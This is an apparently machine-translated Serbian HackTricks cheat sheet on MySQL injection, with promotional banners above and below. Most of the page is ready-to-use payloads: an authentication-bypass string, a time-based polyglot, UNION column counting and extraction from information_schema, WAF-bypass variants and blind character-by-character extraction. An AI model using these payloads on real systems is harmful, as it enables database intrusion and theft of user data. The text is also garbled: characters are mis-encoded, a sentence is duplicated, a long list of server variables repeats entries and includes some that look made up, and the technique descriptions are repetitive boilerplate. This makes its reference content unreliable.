# MySQL injection

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetiƒçku bezbednost**? ≈Ωelite li da vidite svoju **kompaniju reklamiranu na HackTricks**? Ili ≈æelite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridru≈æite se** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji kibernetiƒçki dogaƒëaj u **≈†paniji** i jedan od najva≈ænijih u **Evropi**. Sa **misijom promovisanja tehniƒçkog znanja**, ovaj kongres je kljuƒçno mesto susreta tehnolo≈°kih i kibernetiƒçkih profesionalaca u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

## Komentari

```sql
-- MYSQL Comment
# MYSQL Comment
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/ Comment for MySQL version 3.23.02
```

## Interesantne funkcije

### Potvrda Mysql-a:

```
concat('a','b')
database()
version()
user()
system_user()
@@version
@@datadir
rand()
floor(2.9)
length(1)
count(1)
```

### Korisne funkcije

The following functions can be useful when performing MySQL injection:

Sledeƒáe funkcije mogu biti korisne prilikom izvoƒëenja MySQL ubacivanja:

* `version()`: Returns the version of the MySQL server.
* `database()`: Returns the name of the current database.
* `user()`: Returns the username used to connect to the MySQL server.
* `current_user()`: Returns the current user.
* `schema()`: Returns the name of the current schema.
* `@@hostname`: Returns the hostname of the MySQL server.
* `@@datadir`: Returns the data directory of the MySQL server.
* `@@basedir`: Returns the base directory of the MySQL server.
* `@@version_compile_os`: Returns the operating system on which the MySQL server was compiled.
* `@@version`: Returns the version and version comment of the MySQL server.
* `@@global.version_compile_os`: Returns the operating system on which the MySQL server is running.
* `@@global.version`: Returns the version and version comment of the MySQL server.
* `@@global.plugin_dir`: Returns the directory where plugins are installed.
* `@@global.datadir`: Returns the global data directory.
* `@@global.basedir`: Returns the global base directory.
* `@@global.character_set_filesystem`: Returns the character set used for file names on the server's file system.
* `@@global.character_set_client`: Returns the character set used by the client.
* `@@global.character_set_connection`: Returns the character set used for the connection.
* `@@global.character_set_results`: Returns the character set used for the result.
* `@@global.collation_connection`: Returns the collation used for the connection.
* `@@global.collation_server`: Returns the collation used by the server.
* `@@global.init_connect`: Returns the value of the `init_connect` system variable.
* `@@global.innodb_version`: Returns the version of the InnoDB storage engine.
* `@@global.max_allowed_packet`: Returns the value of the `max_allowed_packet` system variable.
* `@@global.sql_mode`: Returns the value of the `sql_mode` system variable.
* `@@global.time_zone`: Returns the value of the `time_zone` system variable.
* `@@global.tx_isolation`: Returns the value of the `tx_isolation` system variable.
* `@@global.version_comment`: Returns the version comment of the MySQL server.
* `@@global.wait_timeout`: Returns the value of the `wait_timeout` system variable.
* `@@global.have_ssl`: Returns `YES` if the server supports SSL, `NO` otherwise.
* `@@global.have_compress`: Returns `YES` if the server supports compression, `NO` otherwise.
* `@@global.have_crypt`: Returns `YES` if the server supports encryption, `NO` otherwise.
* `@@global.have_dynamic_loading`: Returns `YES` if the server supports dynamic loading, `NO` otherwise.
* `@@global.have_geometry`: Returns `YES` if the server supports spatial data types, `NO` otherwise.
* `@@global.have_innodb`: Returns `YES` if the server supports the InnoDB storage engine, `NO` otherwise.
* `@@global.have_ndbcluster`: Returns `YES` if the server supports the NDB storage engine, `NO` otherwise.
* `@@global.have_openssl`: Returns `YES` if the server supports OpenSSL, `NO` otherwise.
* `@@global.have_partitioning`: Returns `YES` if the server supports partitioning, `NO` otherwise.
* `@@global.have_profiling`: Returns `YES` if the server supports profiling, `NO` otherwise.
* `@@global.have_query_cache`: Returns `YES` if the server supports the query cache, `NO` otherwise.
* `@@global.have_rtree_keys`: Returns `YES` if the server supports R-tree indexes, `NO` otherwise.
* `@@global.have_ssl`: Returns `YES` if the server supports SSL, `NO` otherwise.
* `@@global.have_symlink`: Returns `YES` if the server supports symbolic links, `NO` otherwise.
* `@@global.have_system_time_zone`: Returns `YES` if the server has a system time zone, `NO` otherwise.
* `@@global.have_timezone_support`: Returns `YES` if the server supports time zones, `NO` otherwise.
* `@@global.have_udf`: Returns `YES` if the server supports user-defined functions, `NO` otherwise.
* `@@global.have_utf8mb4`: Returns `YES` if the server supports the utf8mb4 character set, `NO` otherwise.
* `@@global.have_xml`: Returns `YES` if the server supports XML, `NO` otherwise.
* `@@global.have_zip`: Returns `YES` if the server supports ZIP, `NO` otherwise.
* `@@global.have_partitioning`: Returns `YES` if the server supports partitioning, `NO` otherwise.
* `@@global.have_profiling`: Returns `YES` if the server supports profiling, `NO` otherwise.
* `@@global.have_query_cache`: Returns `YES` if the server supports the query cache, `NO` otherwise.
* `@@global.have_rtree_keys`: Returns `YES` if the server supports R-tree indexes, `NO` otherwise.
* `@@global.have_ssl`: Returns `YES` if the server supports SSL, `NO` otherwise.
* `@@global.have_symlink`: Returns `YES` if the server supports symbolic links, `NO` otherwise.
* `@@global.have_system_time_zone`: Returns `YES` if the server has a system time zone, `NO` otherwise.
* `@@global.have_timezone_support`: Returns `YES` if the server supports time zones, `NO` otherwise.
* `@@global.have_udf`: Returns `YES` if the server supports user-defined functions, `NO` otherwise.
* `@@global.have_utf8mb4`: Returns `YES` if the server supports the utf8mb4 character set, `NO` otherwise.
* `@@global.have_xml`: Returns `YES` if the server supports XML, `NO` otherwise.
* `@@global.have_zip`: Returns `YES` if the server supports ZIP, `NO` otherwise.

These functions can provide valuable information about the MySQL server, which can be useful during a penetration test or security assessment.

```sql
SELECT hex(database())
SELECT conv(hex(database()),16,10) # Hexadecimal -> Decimal
SELECT DECODE(ENCODE('cleartext', 'PWD'), 'PWD')# Encode() & decpde() returns only numbers
SELECT uncompress(compress(database())) #Compress & uncompress() returns only numbers
SELECT replace(database(),"r","R")
SELECT substr(database(),1,1)='r'
SELECT substring(database(),1,1)=0x72
SELECT ascii(substring(database(),1,1))=114
SELECT database()=char(114,101,120,116,101,115,116,101,114)
SELECT group_concat(<COLUMN>) FROM <TABLE>
SELECT group_concat(if(strcmp(table_schema,database()),table_name,null))
SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END)
strcmp(),mid(),,ldap(),rdap(),left(),rigth(),instr(),sleep()
```

## Sve vrste ubrizgavanja

### SQL ubrizgavanje u MySQL

SQL ubrizgavanje je jedna od najƒçe≈°ƒáih i najopasnijih ranjivosti web aplikacija. Kada se koristi MySQL baza podataka, napadaƒç mo≈æe iskoristiti ovu ranjivost kako bi izvr≈°io zlonamerni SQL kod na serveru baze podataka.

#### Ubrizgavanje jednostavnih izjava

Ubrizgavanje jednostavnih izjava je najosnovniji oblik SQL ubrizgavanja. Napadaƒç mo≈æe umetnuti zlonamerni SQL kod u unos koji se prosleƒëuje bazi podataka. Na primer, napadaƒç mo≈æe umetnuti `' OR '1'='1` u polje za unos korisniƒçkog imena i lozinke kako bi zaobi≈°ao proveru autentiƒçnosti.

#### Ubrizgavanje bazirano na vremenu

Ubrizgavanje bazirano na vremenu je tehnika koja se koristi kada se ne dobija direktni rezultat ubrizgavanja. Napadaƒç mo≈æe iskoristiti ovu tehniku kako bi izvr≈°io zlonamerni SQL kod i dobio informacije o bazi podataka na osnovu vremena potrebnog za izvr≈°avanje SQL upita.

#### Ubrizgavanje bazirano na gre≈°kama

Ubrizgavanje bazirano na gre≈°kama je tehnika koja se koristi kada se dobija gre≈°ka prilikom izvr≈°avanja SQL upita. Napadaƒç mo≈æe iskoristiti ovu gre≈°ku kako bi dobio informacije o bazi podataka ili izvr≈°io zlonamerni SQL kod.

#### Ubrizgavanje bazirano na uniji

Ubrizgavanje bazirano na uniji je tehnika koja se koristi kada se koristi SQL upit koji koristi operaciju unije. Napadaƒç mo≈æe iskoristiti ovu tehniku kako bi dobio informacije o bazi podataka iz drugih tabela.

#### Ubrizgavanje bazirano na slepoj ubrizgavanju

Ubrizgavanje bazirano na slepoj ubrizgavanju je tehnika koja se koristi kada se ne dobija direktni rezultat ubrizgavanja i ne dolazi do gre≈°ke prilikom izvr≈°avanja SQL upita. Napadaƒç mo≈æe iskoristiti ovu tehniku kako bi dobio informacije o bazi podataka na osnovu uslova koji se ispituju.

#### Ubrizgavanje bazirano na vi≈°estrukim upitima

Ubrizgavanje bazirano na vi≈°estrukim upitima je tehnika koja se koristi kada se izvr≈°ava vi≈°e SQL upita odjednom. Napadaƒç mo≈æe iskoristiti ovu tehniku kako bi izvr≈°io zlonamerni SQL kod i dobio informacije o bazi podataka.

#### Ubrizgavanje bazirano na funkcijama

Ubrizgavanje bazirano na funkcijama je tehnika koja se koristi kada se koriste SQL funkcije. Napadaƒç mo≈æe iskoristiti ovu tehniku kako bi izvr≈°io zlonamerni SQL kod i dobio informacije o bazi podataka.

#### Ubrizgavanje bazirano na izvr≈°avanju sistema

Ubrizgavanje bazirano na izvr≈°avanju sistema je tehnika koja se koristi kada se koristi SQL funkcija koja omoguƒáava izvr≈°avanje sistema. Napadaƒç mo≈æe iskoristiti ovu tehniku kako bi izvr≈°io zlonamerni kod na serveru baze podataka.

#### Ubrizgavanje bazirano na izvr≈°avanju datoteka

Ubrizgavanje bazirano na izvr≈°avanju datoteka je tehnika koja se koristi kada se koristi SQL funkcija koja omoguƒáava izvr≈°avanje datoteka. Napadaƒç mo≈æe iskoristiti ovu tehniku kako bi izvr≈°io zlonamerni kod na serveru baze podataka.

#### Ubrizgavanje bazirano na izvr≈°avanju operativnog sistema

Ubrizgavanje bazirano na izvr≈°avanju operativnog sistema je tehnika koja se koristi kada se koristi SQL funkcija koja omoguƒáava izvr≈°avanje operativnog sistema. Napadaƒç mo≈æe iskoristiti ovu tehniku kako bi izvr≈°io zlonamerni kod na serveru baze podataka.

```sql
SELECT * FROM some_table WHERE double_quotes = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/"
```

sa [https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/](https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/)

## Tok

Zapamtite da u "modernim" verzijama **MySQL**-a mo≈æete zameniti "_**information\_schema.tables**_" sa "_**mysql.innodb\_table\_stats**_**"** (Ovo mo≈æe biti korisno za zaobila≈æenje WAF-ova).

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();#Get name of the tables
SELECT column_name FROM information_schema.columns WHERE table_name="<TABLE_NAME>"; #Get name of the columns of the table
SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values
SELECT user FROM mysql.user WHERE file_priv='Y'; #Users with file privileges
```

### **Samo 1 vrednost**

* `group_concat()`
* `Limit X,1`

### **Slepo jedan po jedan**

* `substr(version(),X,1)='r'` ili `substring(version(),X,1)=0x70` ili `ascii(substr(version(),X,1))=112`
* `mid(version(),X,1)='5'`

### **Slepo dodavanje**

* `LPAD(version(),1...lenght(version()),'1')='asd'...`
* `RPAD(version(),1...lenght(version()),'1')='asd'...`
* `SELECT RIGHT(version(),1...lenght(version()))='asd'...`
* `SELECT LEFT(version(),1...lenght(version()))='asd'...`
* `SELECT INSTR('foobarbar', 'fo...')=1`

## Otkrivanje broja kolona

Koristeƒái jednostavno ORDER

```
order by 1
order by 2
order by 3
...
order by XXX

UniOn SeLect 1
UniOn SeLect 1,2
UniOn SeLect 1,2,3
...
```

## MySQL baziran na Uniji

### Opis

MySQL baziran na Uniji je tehnika SQL injekcije koja se koristi za izvlaƒçenje podataka iz baze podataka kroz kombinovanje rezultata vi≈°e SQL upita. Ova tehnika se koristi kada je ciljna aplikacija podlo≈æna SQL injekciji i koristi MySQL bazu podataka.

### Postupak

Da biste izvr≈°ili MySQL baziran na Uniji, pratite sledeƒáe korake:

1. Identifikujte taƒçke injekcije: Pronaƒëite ulazne taƒçke u ciljnoj aplikaciji gde mo≈æete ubaciti SQL kod.
2. Utvrdite broj kolona: Koristite `ORDER BY` klauzulu da biste utvrdili broj kolona u rezultatu SQL upita. Poveƒáavajte broj kolona dok ne dobijete gre≈°ku ili ispravan rezultat.
3. Identifikujte tip podataka: Koristite `UNION SELECT` izraz da biste identifikovali tip podataka u svakoj koloni. Poveƒáavajte broj kolona i pratite gre≈°ke ili ispravne rezultate kako biste utvrdili tip podataka.
4. Izvlaƒçenje podataka: Koristite `UNION SELECT` izraz da biste izvukli podatke iz baze podataka. Mo≈æete koristiti funkciju `CONCAT()` da biste kombinovali podatke iz razliƒçitih kolona u jedan rezultat.

### Primer

Pretpostavimo da imamo sledeƒái SQL upit u ciljnoj aplikaciji:

```sql
SELECT name, email FROM users WHERE id = '<user_id>'
```

Da bismo izvr≈°ili MySQL baziran na Uniji, mo≈æemo koristiti sledeƒái payload:

```sql
' UNION SELECT 1,2 FROM users --
```

Ovaj payload ƒáe izvr≈°iti sledeƒái SQL upit:

```sql
SELECT name, email FROM users WHERE id = '' UNION SELECT 1,2 FROM users --'
```

Kao rezultat, dobiƒáemo kombinovane rezultate iz prvog upita (`SELECT name, email FROM users WHERE id = ''`) i drugog upita (`SELECT 1,2 FROM users`).

```sql
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```

## SSRF

**Ovde mo≈æete nauƒçiti razliƒçite opcije za** [**zloupotrebu Mysql ubacivanja kako biste dobili SSRF**](mysql-ssrf.md)**.**

## Trikovi za zaobila≈æenje WAF-a

### Alternative za information\_schema

Zapamtite da u "modernim" verzijama **MySQL**-a mo≈æete zameniti _**information\_schema.tables**_ sa _**mysql.innodb\_table\_stats**_ ili sa _**sys.x$schema\_flattened\_keys**_ ili sa **sys.schema\_table\_statistics**

### MySQL ubacivanje bez ZAREZA

Izaberite 2 kolone bez kori≈°ƒáenja zareza ([https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma](https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma)):

```
-1' union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#
```

### Dobijanje vrednosti bez imena kolone

Ako u nekom trenutku znate ime tabele, ali ne znate ime kolona unutar tabele, mo≈æete poku≈°ati da pronaƒëete koliko ima kolona izvr≈°avanjem neƒçega poput:

```bash
# When a True is returned, you have found the number of columns
select (select "", "") = (SELECT * from demo limit 1);     # 2columns
select (select "", "", "") < (SELECT * from demo limit 1); # 3columns
```

Pretpostavljajuƒái da postoje 2 kolone (pri ƒçemu je prva ID, a druga zastava), mo≈æete poku≈°ati brutalno probiti sadr≈æaj zastave poku≈°avajuƒái karakter po karakter:

```bash
# When True, you found the correct char and can start ruteforcing the next position
select (select 1, 'flaf') = (SELECT * from demo limit 1);
```

Vi≈°e informacija mo≈æete pronaƒái na [https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952](https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952)

### Istorija MySQL-a

Mo≈æete videti druge izvr≈°avanja unutar MySQL-a ƒçitajuƒái tabelu: **sys.x$statement\_analysis**

### Alternative verzije

```
mysql> select @@innodb_version;
mysql> select @@version;
mysql> select version();
```

## Ostali vodiƒçi za MYSQL ubacivanje

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)]

## Reference

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji dogaƒëaj u oblasti sajber bezbednosti u **≈†paniji** i jedan od najva≈ænijih u **Evropi**. Sa **misijom promovisanja tehniƒçkog znanja**, ovaj kongres je kljuƒçno mesto susreta tehnolo≈°kih i sajber bezbednosnih profesionalaca u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za sajber bezbednost**? ≈Ωelite li da vidite **va≈°u kompaniju reklamiranu na HackTricks-u**? Ili ≈æelite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridru≈æite se** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
